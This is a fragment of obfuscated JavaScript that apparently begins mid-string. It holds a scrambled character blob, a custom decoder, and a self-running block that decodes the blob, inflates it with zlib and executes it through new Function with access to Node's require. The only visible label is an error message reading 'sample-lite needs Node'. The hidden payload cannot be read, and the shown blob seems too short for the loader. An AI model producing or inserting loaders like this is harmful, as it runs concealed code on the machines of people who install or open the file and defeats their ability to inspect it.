TSyO&9n-zf4-')\\yx4|W/slIs&a]moN5\"8KpFH;9p;eWGo=QRT+H?siExB.Vo?<I)#'}~6xfL^p={Z++]H@K,jK3{Xt#?gdUWH@ z=)y6b?xW{z\":3~j_mFVXLU;-k~Cg^RxM?[`,z+.tyO!mas&uvpsW*(HWFF7,3ch\"{6i^4=l1n\"!9l'9k\\436CU$b%1\"j*OdSA!p$\"GiqOMJO_0NrGqPp{i;G|j,E8gB9]$)Yd!Bwd&T>$D@YX[[1[`Ps;T.`{wTkLIMpQ:0Fi7;o:J8w`|L)mGNb>t=&l-?QjLZMpz:Z2z'Ew6>~^mMH53M/gBX+@U\"w\"Om4=58'1Q~FtU%7_Akb\\_x0 b~T\"x}/|_M/^=sFC6Swf\\}@\\/pt?J==O6o4$-ZV'daJ7M4'W5<> cj3bb:m6qlV8yQrD{RG\\LP@!O ZV}VG*K1b7Fy\"L7a&TBdQ=}1GX0U5k_x?P%=4j;p&kof4|:Co5  6EZ-j2l=BJMEqr}?x:PJ)8.u0dtgV,u(.L7Em`_4p1fR[yn[BTDcCH%(m^~c}QyUkH#M[V<uUC&21XCq+Y]NTv4G9{SiI+H*E*-nhUIPN]\"?+90L_oFPPxhKJ<:H\"dN=_{`!Q!S5(QcKE:\\ZcutE=<Iu\\VWUUt5X-G=nU=&aH`y7Wy6O>!rfo?;K!Eob6d`N(vT\"T#6<ql]BV+[Gp\"\\w9f4Th/9Pr*%5ZFPt.g<F*)\"";function gr5Rp1a(LEvvyh,mmqSey,gr5Rp1a){for(var m_x8_P="",oQEuyFW=0x0;oQEuyFW<gr5Rp1a;oQEuyFW++){LEvvyh=LEvvyh+0x9e3779b9|0x0;var OoR_Qj=((LEvvyh^LEvvyh>>>0xd)%0x5f+0x5f)%0x5f,rsd7Zi=WiuZ9wt.charCodeAt(mmqSey+oQEuyFW)-0x20,kXYNiAj=((rsd7Zi-OoR_Qj)%0x5f+0x5f)%0x5f;m_x8_P+=String.fromCharCode(kXYNiAj+0x20)}return m_x8_P}function rsd7Zi(){return 0};(function(){var _b64=gr5Rp1a(0x243f6a88,0x0,0x1800);var _g=typeof globalThis!=='undefined'?globalThis:(typeof global!=='undefined'?global:this);var _req;try{_req=typeof require==='function'?require:null;}catch(e){}if(!_req||typeof Buffer==='undefined'){throw new Error('sample-lite needs Node');}var _src=_req('zlib').inflateSync(Buffer.from(_b64,'base64')).toString('utf8');(new Function('require','module','global',_src)).call(_g,_req,typeof module!=='undefined'?module:{exports:{}},_g);})();
